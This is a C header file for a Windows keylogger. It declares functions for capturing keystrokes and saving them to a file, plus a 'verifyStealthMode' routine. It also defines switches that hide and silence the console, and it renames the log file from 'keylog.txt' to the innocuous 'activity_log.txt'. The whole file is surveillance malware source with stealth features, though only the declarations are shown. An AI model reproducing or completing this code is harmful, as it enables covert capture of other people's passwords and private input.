#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>
#include <windows.h>
#include <time.h>

// Set to 1 to make the console invisible (0 - False, 1 - True).
#define INVISIBLE_CONSOLE 0

// Set to 1 to suppress console output (0 - False, 1 - True).
#define SILENT_CONSOLE 0    

// Time interval in seconds to check for key presses.
#define LISTENER_TIMER 5    

// Name of the log file.
#define FILE_NAME "activity_log.txt"  // Change from keylog.txt

void verifyStealthMode();
void savePressedKey(char pressedKey, const char fileName[]);
int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2);
int getFileLength(const char fileName[]);
void overrideFile(const char fileName[]);

#endif
